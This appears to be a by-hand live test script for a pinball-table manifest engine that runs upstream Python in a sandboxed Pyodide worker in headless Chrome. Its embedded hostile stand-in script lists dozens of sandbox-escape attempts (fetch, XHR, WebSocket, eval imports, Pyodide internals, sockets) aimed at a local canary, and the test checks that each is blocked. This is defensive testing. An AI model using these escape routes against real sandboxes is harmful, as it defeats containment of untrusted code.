// Test Manifest engine against the real thing, run BY HAND:
//   node tests/test-manifest-live.mjs
// Not part of npm test (no ".test" in the name): it needs the network, and a
// change upstream must never fail this repo's CI. It runs upstream's scripts
// only inside Chrome's sandbox, on a throwaway profile, never in local Python.
//
// Part 1: the real upstream scripts build a real manifest after the lockdown.
// Part 2: a hostile stand-in for upstream's script tries every way out it can.
// Part 3: the real page, end to end: a folder picked through the real input.
//   LIVE_TABLE=<folder> LIVE_MANIFEST=<reference manifest.json> tests a real
//   table against a reference; without them a small folder is made on the spot.
// Part 4, with LIVE_TABLE only: real builder output. The table's table.yml is
//   imported, the builder writes it back out, and Test This YML must give the
//   same manifest.
// A canary route on this server records anything that reaches it, so escaping
// is measured, not inferred. A control request before the lockdown proves the
// canary works.

import { spawn } from 'node:child_process';
import { createServer } from 'node:http';
import { readFile, writeFile, mkdir, mkdtemp, rm } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { check, report, repoPath, REPO } from './harness.mjs';
import { findChrome } from './browser.mjs';

const VPSDB_URL = 'https://virtualpinballspreadsheet.github.io/vps-db/db/vpsdb.json';
const db = await (await fetch(VPSDB_URL)).text();
const YML = 'backglassVPSId: "Saxn4nV9"\nfps: 60\ntableVPSId: "HhMnyw53"\nvpxVPSId: "Saxn4nV9"\nvpxChecksum: "C95CD5EBA529FBD8CBB6686457839678"\n';
// The smallest valid PNG; the script only checks that launcher.png exists.
const PNG = 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII=';

// Runs at import time inside the fake upstream script's main().
const HOSTILE_PYTHON = `
import json, sys, asyncio
def main(argv=None):
    import js, pyodide_js, pyodide
    import pyodide.http, pyodide.code
    canary = CANARY
    tries = {}
    def attempt(name, fn):
        try:
            fn()
            tries[name] = 'ran'
        except BaseException as e:
            tries[name] = 'blocked: ' + repr(e)[:90]
    u = lambda via: canary + '?via=' + via
    attempt('js.fetch', lambda: js.fetch(u('js.fetch')))
    attempt('js.self.fetch', lambda: js.self.fetch(u('self.fetch')))
    attempt('js.globalThis.fetch', lambda: js.globalThis.fetch(u('globalThis.fetch')))
    attempt('pyfetch', lambda: asyncio.ensure_future(pyodide.http.pyfetch(u('pyfetch'))))
    attempt('open_url', lambda: pyodide.http.open_url(u('open_url')))
    def xhr():
        r = js.XMLHttpRequest.new(); r.open('GET', u('xhr'), False); r.send()
    attempt('XMLHttpRequest', xhr)
    attempt('WebSocket', lambda: js.WebSocket.new(u('ws').replace('http', 'ws')))
    attempt('EventSource', lambda: js.EventSource.new(u('eventsource')))
    attempt('importScripts', lambda: js.importScripts(u('importScripts')))
    attempt('Worker', lambda: js.Worker.new(u('worker')))
    attempt('js.eval import', lambda: js.eval("import('" + u('eval-import') + "')"))
    attempt('js.Function', lambda: js.Function.new("return import('" + u('Function') + "')")())
    attempt('Object.constructor', lambda: js.Object.constructor("return import('" + u('ctor') + "')")())
    attempt('run_js import', lambda: pyodide.code.run_js("import('" + u('run_js') + "')"))
    attempt('loadPackage', lambda: pyodide_js.loadPackage(canary + '/pkg-1.0-py3-none-any.whl'))
    attempt('setTimeout string', lambda: js.setTimeout("import('" + u('setTimeout') + "')", 0))
    attempt('setInterval string', lambda: js.setInterval("import('" + u('setInterval') + "')", 100000))
    attempt('FontFace', lambda: js.FontFace.new('x', 'url(' + u('font') + ')').load())
    attempt('RTCPeerConnection', lambda: js.RTCPeerConnection.new())
    attempt('WebSocketStream', lambda: js.WebSocketStream.new(u('wss').replace('http', 'ws')))
    attempt('WebTransport', lambda: js.WebTransport.new(u('wt').replace('http:', 'https:')))
    attempt('SharedWorker', lambda: js.SharedWorker.new(u('shared')))
    attempt('BroadcastChannel', lambda: js.BroadcastChannel.new('x'))
    attempt('Notification', lambda: js.Notification.requestPermission())
    attempt('serviceWorker', lambda: js.navigator.serviceWorker.register(u('sw')))
    attempt('storageBuckets', lambda: js.navigator.storageBuckets.open('x'))
    attempt('locks', lambda: js.navigator.locks.query())
    attempt('webkitRequestFileSystem', lambda: js.webkitRequestFileSystem(0, 1))
    # Pyodide's own loader is a bare import(url). Calling every internal blindly
    # hangs the worker, so each one that could reach it is named here.
    def internal(owner, name, *args):
        def call():
            value = getattr(owner, name)
            value(*args)
        return call
    api = getattr(pyodide_js, '_api', None)
    module = getattr(pyodide_js, '_module', None)
    tries['seen _api'] = 'blocked: ' + str(api is not None)
    tries['seen _module'] = 'blocked: ' + str(module is not None)
    for owner_name, owner in (('_api', api), ('_module', module), ('pyodide_js', pyodide_js)):
        for name in ('loadScript', 'loadBinaryFile', 'loadDynlib', 'fetch', 'eval', 'runJs', 'dynamicImport'):
            attempt('internal ' + owner_name + '.' + name, internal(owner, name, u(owner_name + '.' + name)))
    attempt('indexedDB', lambda: js.indexedDB.open('x'))
    attempt('caches', lambda: js.caches.open('x'))
    attempt('navigator.storage', lambda: js.navigator.storage.estimate())
    def stdlib():
        import urllib.request
        urllib.request.urlopen(u('urllib'), timeout=2)
    attempt('urllib', stdlib)
    def sock():
        import socket
        s = socket.create_connection(('127.0.0.1', PORT), timeout=2); s.send(b'GET /canary?via=socket HTTP/1.0\\r\\n\\r\\n')
    attempt('socket', sock)
    print('TRIES ' + json.dumps(tries))
    return 7
`;

const TYPES = { '.js': 'text/javascript', '.html': 'text/html', '.css': 'text/css', '.svg': 'image/svg+xml', '.png': 'image/png', '.json': 'application/json' };
const canaryHits = [];
const server = createServer(async (req, res) => {
  const url = new URL(req.url, 'http://x');
  res.setHeader('access-control-allow-origin', '*');
  if (url.pathname.startsWith('/canary')) {
    canaryHits.push(url.searchParams.get('via') || url.pathname);
    res.writeHead(200, { 'content-type': 'text/javascript' }); res.end('');
    return;
  }
  if (url.pathname === '/hostile/scripts/generate-test-manifest.py') {
    const { port } = server.address();
    res.writeHead(200); res.end(HOSTILE_PYTHON
      .replaceAll('CANARY', JSON.stringify(`http://127.0.0.1:${port}/canary`)).replaceAll('PORT', String(port)));
    return;
  }
  if (url.pathname.startsWith('/hostile/')) { res.writeHead(200); res.end('# stand-in\n'); return; }
  if (url.pathname === '/host.html') { res.writeHead(200, { 'content-type': 'text/html' }); res.end('<!DOCTYPE html><title>host</title>'); return; }
  try {
    const file = path.resolve(repoPath(decodeURIComponent(url.pathname).slice(1)));
    if (!file.startsWith(REPO + path.sep)) throw new Error('outside the repo');
    const body = await readFile(file);
    res.writeHead(200, { 'content-type': TYPES[path.extname(url.pathname)] || 'application/octet-stream' });
    res.end(body);
  } catch { res.writeHead(404); res.end(); }
});
await new Promise(resolve => server.listen(0, '127.0.0.1', resolve));
const base = `http://127.0.0.1:${server.address().port}`;

const profile = await mkdtemp(path.join(tmpdir(), 'manifest-live-'));
const chrome = spawn(findChrome(), ['--headless=new', '--remote-debugging-port=0', `--user-data-dir=${profile}`,
  '--no-first-run', '--no-default-browser-check', '--disable-extensions', 'about:blank'], { stdio: ['ignore', 'ignore', 'pipe'] });
let stderr = '';
const browserWs = await new Promise(resolve => chrome.stderr.on('data', chunk => {
  stderr += chunk;
  const match = stderr.match(/DevTools listening on (ws:\/\/\S+)/);
  if (match) resolve(match[1]);
}));
const pages = await (await fetch(`http://127.0.0.1:${new URL(browserWs).port}/json/list`)).json();
const ws = new WebSocket(pages.find(page => page.type === 'page').webSocketDebuggerUrl);
await new Promise(resolve => ws.addEventListener('open', resolve));
let nextId = 0;
const pending = new Map();
ws.addEventListener('message', ({ data }) => {
  const message = JSON.parse(data);
  if (pending.has(message.id)) { pending.get(message.id)(message); pending.delete(message.id); }
});
const send = (method, params = {}) => new Promise(resolve => {
  const id = ++nextId; pending.set(id, resolve); ws.send(JSON.stringify({ id, method, params }));
});
const evaluate = async expression => {
  // A hostile script can hang the worker, and an unanswered evaluate waits forever.
  const reply = await Promise.race([
    send('Runtime.evaluate', { expression, returnByValue: true, awaitPromise: true }),
    new Promise((_, reject) => setTimeout(() => reject(new Error('no answer from the page in 120 s')), 120000))
  ]);
  if (reply.result?.exceptionDetails) throw new Error(JSON.stringify(reply.result.exceptionDetails).slice(0, 500));
  return reply.result?.result?.value;
};

await send('Page.enable');
await send('Page.navigate', { url: `${base}/host.html` });
await new Promise(resolve => setTimeout(resolve, 800));

// One engine run from the page's side. Returns only what JSON can carry.
const session = options => `(async () => {
  const options = ${JSON.stringify(options)};
  const worker = new Worker('/js.src/testManifestWorker.js', { type: 'module' });
  let id = 0; const waiting = new Map();
  worker.onerror = event => { for (const [, reject] of waiting.values()) reject(new Error(event.message)); };
  worker.onmessage = ({ data }) => {
    if (!waiting.has(data.id)) return;
    const [resolve, reject] = waiting.get(data.id); waiting.delete(data.id);
    if (data.error) reject(Object.assign(new Error(data.error), { code: data.code })); else resolve(data.value);
  };
  const ask = message => new Promise((resolve, reject) => { const n = ++id; waiting.set(n, [resolve, reject]); worker.postMessage({ ...message, id: n }); });
  const out = {};
  try {
    await ask({ type: 'init', db: options.db, scriptsBase: options.scriptsBase });
    if (options.control) await fetch(options.control);
    const bytes = text => new TextEncoder().encode(text);
    const png = Uint8Array.from(atob(${JSON.stringify(PNG)}), c => c.charCodeAt(0));
    const result = await ask({ type: 'run', folder: 'vpx-live', files: [['table.yml', bytes(options.yml)], ['launcher.png', png], ['sub/note.txt', bytes('x')]] });
    out.result = { ...result, zip: result.zip ? result.zip.length : 0 };
  } catch (error) { out.error = error.message; out.code = error.code; }
  await new Promise(resolve => setTimeout(resolve, 1500));
  worker.terminate();
  return JSON.stringify(out);
})()`;

try {
// Part 1: the real scripts, locked.
const real = JSON.parse(await evaluate(session({ db, yml: YML })));
check('real upstream scripts run after the lockdown', real.result?.ok === true, JSON.stringify(real).slice(0, 500));
const manifest = real.result?.manifest ? JSON.parse(real.result.manifest) : {};
check('the manifest has the one table, keyed by its folder', JSON.stringify(Object.keys(manifest)) === '["vpx-live"]', JSON.stringify(Object.keys(manifest)));
check('the zip came back', real.result?.zip > 0, String(real.result?.zip));

const badId = JSON.parse(await evaluate(session({ db, yml: YML.replace('HhMnyw53', 'NOPE0000') })));
check('a bad VPS ID comes back as a failed run with upstream\'s message',
  badId.result?.ok === false && badId.result.stderr.includes('Table NOPE0000 not found in VPSDB'), JSON.stringify(badId).slice(0, 400));
const noDb = JSON.parse(await evaluate(session({ db: '[]', yml: YML })));
check('an empty database stops before anything runs', noDb.code === 'database', JSON.stringify(noDb));
const noScripts = JSON.parse(await evaluate(session({ db, yml: YML, scriptsBase: `${base}/missing/` })));
check('a failed script download says so', noScripts.code === 'scripts', JSON.stringify(noScripts));

// Part 2: the hostile script. The control runs from the page, unlocked.
canaryHits.length = 0;
const hostile = JSON.parse(await evaluate(session({
  db, yml: YML, scriptsBase: `${base}/hostile/`, control: `${base}/canary?via=control`
})));
const line = (hostile.result?.stdout || '').split('\n').find(text => text.startsWith('TRIES ')) || '';
const tries = line ? JSON.parse(line.slice(6)) : {};
console.log('hostile attempts:');
for (const [name, outcome] of Object.entries(tries)) console.log(`  ${name.padEnd(22)} ${outcome}`);
if (!line) console.log(JSON.stringify(hostile).slice(0, 900));
console.log('canary hits:', JSON.stringify(canaryHits));
check('the hostile script really ran', Object.keys(tries).length >= 20, String(Object.keys(tries).length));
check('the canary works: the control request reached it', canaryHits.includes('control'), JSON.stringify(canaryHits));
const escaped = canaryHits.filter(via => via !== 'control');
check('nothing escaped the locked worker', escaped.length === 0, JSON.stringify(escaped));
// These two only start something asynchronous, so "ran" says nothing and the
// canary is their test, as it is for Pyodide's internals, which can run harmlessly.
const ASYNC_ONLY = new Set(['pyfetch', 'loadPackage']);
const notBlocked = Object.entries(tries)
  .filter(([name, outcome]) => !ASYNC_ONLY.has(name) && !name.startsWith('internal ') && !outcome.startsWith('blocked'));
check('every direct route was refused, storage included', notBlocked.length === 0, JSON.stringify(notBlocked));


// Part 3: the real page. Blobs are captured so the downloads can be read back.
const table = process.env.LIVE_TABLE || path.join(profile, 'vpx-live');
if (!process.env.LIVE_TABLE) {
  await mkdir(table, { recursive: true });
  await writeFile(path.join(table, 'table.yml'), YML);
}
await send('DOM.enable');
await send('Page.navigate', { url: `${base}/index.html` });
await new Promise(resolve => setTimeout(resolve, 2500));
await evaluate(`(async () => {
  window.__blobs = [];
  const original = URL.createObjectURL.bind(URL);
  URL.createObjectURL = blob => { window.__blobs.push(blob); return original(blob); };
  await window.fetchVPSDB();
})()`);
const documentNode = await send('DOM.getDocument');
const inputNode = await send('DOM.querySelector', { nodeId: documentNode.result.root.nodeId, selector: '#testFolderInput' });
await send('DOM.setFileInputFiles', { nodeId: inputNode.result.nodeId, files: [table] });
const page = JSON.parse(await evaluate(`(async () => {
  const status = () => document.getElementById('testManifestStatus')?.textContent || '';
  const started = Date.now();
  const finished = () => document.getElementById('testManifestDone')?.textContent === 'Close' && status();
  while (Date.now() - started < 90000 && !finished()) {
    await new Promise(resolve => setTimeout(resolve, 100));
  }
  document.getElementById('testManifestSaveManifest')?.click();
  document.getElementById('testManifestSaveZip')?.click();
  await new Promise(resolve => setTimeout(resolve, 200));
  const blobs = window.__blobs.slice(-2);
  return JSON.stringify({
    status: status(),
    notes: [...document.querySelectorAll('#testManifestNotes li')].map(item => item.textContent),
    manifest: blobs[0] ? await blobs[0].text() : '',
    zipBytes: blobs[1] ? blobs[1].size : 0,
    zipStart: blobs[1] ? [...new Uint8Array(await blobs[1].slice(0, 2).arrayBuffer())] : []
  });
})()`));
const folderName = path.basename(table);
console.log('page says:', page.status, JSON.stringify(page.notes));
check('the real page builds the manifest', page.status === `Manifest built for ${folderName}.`, page.status);
check('the page offers a real zip', page.zipBytes > 0 && page.zipStart[0] === 80 && page.zipStart[1] === 75, JSON.stringify(page.zipStart));
const pageManifest = page.manifest ? JSON.parse(page.manifest) : {};
check('the page\'s manifest is keyed by the folder', Object.keys(pageManifest)[0] === folderName, JSON.stringify(Object.keys(pageManifest)));
if (process.env.LIVE_MANIFEST) {
  const reference = JSON.parse(await readFile(process.env.LIVE_MANIFEST, 'utf8'));
  check('the page\'s manifest matches the reference exactly',
    JSON.stringify(pageManifest) === JSON.stringify(reference), page.manifest.slice(0, 300));
}

// Part 4: the builder's own output through Test This YML.
if (process.env.LIVE_TABLE) {
  await evaluate(`(async () => { document.getElementById('testManifestDialog').close(); await new Promise(r => setTimeout(r, 100)); })()`);
  const importDoc = await send('DOM.getDocument');
  const importNode = await send('DOM.querySelector', { nodeId: importDoc.result.root.nodeId, selector: '#ymlImportInput' });
  await send('DOM.setFileInputFiles', { nodeId: importNode.result.nodeId, files: [path.join(table, 'table.yml')] });
  const imported = await evaluate(`(async () => {
    const title = () => document.querySelector('#ymlImportToast .vps-db-toast-title')?.textContent || '';
    const started = Date.now();
    while (Date.now() - started < 15000 && !/YML loaded|could not be loaded|Import cancelled|outdated|Remove/i.test(title())) await new Promise(r => setTimeout(r, 50));
    await new Promise(r => setTimeout(r, 400));
    return title() + ' | ' + (document.querySelector('#ymlImportToast .vps-db-toast-message')?.textContent || '');
  })()`);
  console.log('import says:', imported);
  const pressed = JSON.parse(await evaluate(`(async () => {
    const box = document.getElementById('shortTableNameInput');
    box.focus();
    box.value = ${JSON.stringify(folderName)};
    box.dispatchEvent(new Event('input', { bubbles: true }));
    box.blur();
    window.__opens = 0;
    document.getElementById('testYmlInput').click = () => { window.__opens += 1; };
    document.getElementById('testYmlBtn').click();
    const dialog = document.getElementById('validationDialog');
    const blocked = dialog.open ? dialog.textContent.replace(/\\s+/g, ' ').slice(0, 500) : '';
    return JSON.stringify({ opens: window.__opens, blocked, yml: document.getElementById('previewYaml').textContent });
  })()`));
  console.log('builder wrote:\n' + pressed.yml);
  check('the imported table passes validation', pressed.opens === 1, pressed.blocked);
  if (pressed.opens === 1) {
    const ymlDoc = await send('DOM.getDocument');
    const ymlNode = await send('DOM.querySelector', { nodeId: ymlDoc.result.root.nodeId, selector: '#testYmlInput' });
    await send('DOM.setFileInputFiles', { nodeId: ymlNode.result.nodeId, files: [table] });
    const built = JSON.parse(await evaluate(`(async () => {
      const status = () => document.getElementById('testManifestStatus')?.textContent || '';
      const started = Date.now();
      await new Promise(r => setTimeout(r, 300));
      while (Date.now() - started < 90000 && !(document.getElementById('testManifestDone')?.textContent === 'Close' && status())) await new Promise(r => setTimeout(r, 100));
      const before = window.__blobs.length;
      document.getElementById('testManifestSaveManifest')?.click();
      await new Promise(r => setTimeout(r, 200));
      const blob = window.__blobs[before];
      return JSON.stringify({ status: status(), notes: [...document.querySelectorAll('#testManifestNotes li')].map(i => i.textContent), manifest: blob ? await blob.text() : '' });
    })()`));
    console.log('page says:', built.status, JSON.stringify(built.notes));
    check('Test This YML builds it', built.status === `Manifest built for ${folderName}.`, built.status);
    if (process.env.LIVE_MANIFEST && built.manifest) {
      const reference = JSON.parse(await readFile(process.env.LIVE_MANIFEST, 'utf8'));
      const same = JSON.stringify(JSON.parse(built.manifest)) === JSON.stringify(reference);
      if (!same) {
        const a = JSON.parse(built.manifest)[folderName] || {}; const b = reference[folderName] || {};
        const keys = [...new Set([...Object.keys(a), ...Object.keys(b)])].filter(key => JSON.stringify(a[key]) !== JSON.stringify(b[key]));
        console.log('differing keys:', JSON.stringify(keys.map(key => [key, a[key], b[key]])).slice(0, 900));
      }
      check('real builder output gives the reference manifest', same);
    }
  }
}
} finally {
  ws.close(); chrome.kill(); server.closeAllConnections(); server.close();
  await new Promise(resolve => setTimeout(resolve, 1000));
  await rm(profile, { recursive: true, force: true, maxRetries: 5, retryDelay: 200 }).catch(() => {});
}
report();
